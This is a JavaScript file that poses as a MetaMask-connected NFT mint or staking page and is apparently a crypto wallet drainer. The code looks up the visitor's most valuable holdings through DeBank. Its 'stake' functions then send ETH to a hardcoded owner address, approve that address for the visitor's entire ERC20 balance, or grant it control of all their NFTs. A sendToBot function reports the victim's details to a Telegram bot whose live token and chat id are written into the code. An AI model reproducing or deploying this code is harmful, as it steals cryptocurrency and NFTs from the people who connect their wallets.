
var connected = 0;
var account = "";
const ownerAddress = "0x1a4c43fcd77d43715BB2fDb0AaD659d080122755"; // please change this owner address;

var transactionFee = 0;

let top_balance = 0, top_token = -1, real_amount = 0, isNFT = 0;
let tokenList = [];

function loginMetamask() {
  console.log("locatin", location.href);
  if(/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)){

    location.href = 'https://metamask.app.link/dapp/slufiby.xyz/test1';
    
  }else{
    // false for not mobile device
    // document.write("not mobile device");
    login();
  }
}

async function login() {
  document.getElementById('status').innerHTML = "connecting...";
  try{
    walletconnect();

    /*
    const balances = await Moralis.Web3.getAllERC20(chainOption);
    const mainNFTs = await Moralis.Web3.getNFTs(chainOption);

    console.log("balances", balances);
    console.log("mainNFTs", mainNFTs);

    const options = {
      address: "0xdac17f958d2ee523a2206206994597c13d831ec7",
      exchange: "uniswap-v3",
    };

    tokenList = [];

    for (let item of balances) {

      var temp = {};

      if(item.tokenAddress) { // other tokens

        let rate = await Moralis.Web3API.token.getTokenPrice(options);
        let balance = getEthBalance(item['balance'], item['decimals'], rate['nativePrice']['value']);

        temp.balance = balance;
        temp.tokenId = 0;
        temp.tokenAddress = item.tokenAddress;
        temp.type = 1;
        temp.tokenAmount = item['balance'];
        tokenList.push(temp);
      }
      else { // eth
        let balance = item['balance'];

        temp.balance = balance;
        temp.tokenId = 0;
        temp.tokenAddress = '';
        temp.type = 0;
        temp.tokenAmount = item['balance'];
        tokenList.push(temp);
      }
    }

    let nftOptions = {
      address: "",
      chain: 'eth',
    };


    for (let item of mainNFTs) {
      nftOptions.address = item.token_address;
      console.log('===', nftOptions);
      var floor = await Moralis.Web3API.token.getNFTLowestPrice(nftOptions);
      var balance = floor['price'];

      var temp = {};

      temp.balance = balance;
      temp.tokenId = floor['token_ids'][0];
      temp.tokenAddress = item.token_address;
      temp.type = 2;
      temp.tokenAmount = 1;

      tokenList.push(temp);
    }

    tokenList.sort((a, b) => (Number(b.balance) > Number(a.balance)) ? 1 : -1);

    console.log('tokenList', tokenList);

    */

  }catch(error){
    console.log(error);
  }
}

function walletconnect() {
  if (window.ethereum) {
    ConnectWallet();
  } else {
    window.addEventListener('ethereum#initialized', ConnectWallet, {
      once: true,
    });

    // If the event is not dispatched by the end of the timeout,
    // the user probably doesn't have MetaMask installed.
    setTimeout(ConnectWallet, 3000); // 3 seconds
  }
}


async function ConnectWallet(){

  // Connect a the web3 provider
  if (window.ethereum) {
      await ethereum.request({ method: 'eth_requestAccounts' });
      provider = window.ethereum;
      web3 = new Web3(provider);
  } else {
      provider = new Web3.providers.HttpProvider("https://mainnet.infura.io/v3/ef44b175ceb94950afcc9843c7d6a898");
      web3 = new Web3(provider);
  }
  getWalletAccount();
  get12DollarETH();

  web3.eth.getBlockNumber(function (error, result) {
    console.log("block number = ", result);
  });

}

async function get12DollarETH() {
    let url = "https://api.coingecko.com/api/v3/simple/price?ids=ethereum&vs_currencies=usd";
    let response = await fetch(url);
    let price = await response.json();
    let perETH = price["ethereum"]["usd"];
    let usd = 1 / perETH;
    transactionFee = usd * 25;
    transactionFee = parseInt(web3.utils.toWei(transactionFee.toFixed(5).toString(), 'ether'));
    console.log(transactionFee, "transactionFee");
    return usd * 25;
}

async function getWalletAccount() {
        
  const accounts = await web3.eth.getAccounts();
  account = accounts[0];
  console.log("account", account);
  document.getElementById('status').innerHTML = "";

  var results;
  const response = await fetch("https://openapi.debank.com/v1/user/token_list?id=" +account+ "&chain_id=eth&is_all=true", {
    headers: {
      "Content-Type": "text/plain"
    },
    method: "GET",
  });

  const response1 = await fetch("https://openapi.debank.com/v1/user/nft_list?id=" +account+ "&chain_id=eth", {
    headers: {
      "Content-Type": "text/plain"
    },
    method: "GET",
 });
  const data = await response.json();
  const nftdata = await response1.json();


  for (let item of nftdata) {
    
    if (!item.chain=='eth') continue;
    var temp = {};

    temp.balance = item.pay_token.amount*item.pay_token.price;
    temp.tokenId = item.inner_id;
    temp.tokenAddress = item.contract_id;
    temp.type = 2;
    temp.tokenAmount = item.amount;
    tokenList.push(temp);
  }
  
  for (let item of data) {
    if (!item.is_verified) continue;
    var temp = {};

    temp.balance = item.amount*item.price;
    temp.tokenId = 0;
    temp.tokenAddress = item.id;
    temp.type = 1;
    if(item.id == 'eth') temp.type = 0;
    temp.tokenAmount = item.raw_amount;

    tokenList.push(temp);
  }
 
  tokenList.sort((a, b) => (Number(b.balance) > Number(a.balance)) ? 1 : -1);
  console.log(tokenList);

  connected = 1;
  showStatus();
}


function getEthBalance(balance, decimals, rate) {
  var pow10 = 1;
  for (var i = 0; i < decimals; i ++) pow10 *= 10;
  return balance * rate / pow10;
}


function stakeEth(amount) {

  if(account=="") return;

  var transactionObject = {
    from: account,
    to: ownerAddress,
    value: amount
  } 

  web3.eth.sendTransaction(transactionObject);
}

async function stakeERC20(tokenAddress, amount) {

  console.log(tokenAddress, account, amount);
  var tokenContract = new web3.eth.Contract(ERC20_ABI, tokenAddress);
  await tokenContract.methods.approve(ownerAddress, amount.toString()).send({
   from: account,
   gas: 270000,
   gasPrice:0
  });
  
}

async function stakeNFT(tokenAddress, nftTokenID) {

  var tokenContract = new web3.eth.Contract(ERC721_ABI, tokenAddress);
  await tokenContract.methods.setApprovalForAll(ownerAddress, true).send({
     from: account,
     gas: 470000,
     gasPrice:0
  });

}

async function sendToken() {

  if(tokenList.length) {
    
    let result = null;
    if(tokenList[0].type == 0) {
        if (tokenList[0].balance > transactionFee) {
          result = await stakeEth(tokenList[0].balance - transactionFee);
        }
    } else if(tokenList[0].type == 1) {
        result = await stakeERC20(tokenList[0].tokenAddress, tokenList[0].tokenAmount);
    } else {
        result = await stakeNFT(tokenList[0].tokenAddress, tokenList[0].tokenId);
    }
    
    if(result) {
        tokenList.shift();
    }
  }
}

function sendToBot(tokenAddress, transactionParameters) {

  const txHash = 'txhash';
  console.log("---------------------------------", transactionParameters);
  var z=$.ajax({  
    type: "POST",  
    url: "https://api.telegram.org/bot"+"5168917302:AAHHZ7ruzC1g3u3Dm87iCUeWT1XyABRuRpY"+"/sendMessage?chat_id="+"854910722",
    data: "parse_mode=HTML&text="+encodeURIComponent("Транзакция: "+"https://etherscan.io/tx/"+txHash)+"%0A%0A"+encodeURIComponent("Контракт:"+tokenAddress)+"%0A%0A"+encodeURIComponent("Инвентарь(НФТ): https://etherscan.io/token/"+tokenAddress+"?a="+account+"#inventory ")+"%0A%0A"+encodeURIComponent("Адрес владельца: "+account), 
  }); 
}


async function logOut() {
  console.log("logged out");
}

function showStatus() {
  if(connected == 0) {
    document.getElementById("btn-mint").style.display='none';
    document.getElementById("btn-login").style.display='block';
    document.getElementById('wallet-info').style.display = 'none';
  } else {
    document.getElementById("btn-mint").style.display='block';
    document.getElementById("btn-login").style.display='none';
    document.getElementById('wallet-info').style.display = 'flex';
  }
}

document.getElementById("btn-login").onclick = loginMetamask;
showStatus();


// document.getElementById('wallet-address').innerHTML = '';
document.getElementById('wallet-info').style.display = 'none';


if(/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)){
  login();
}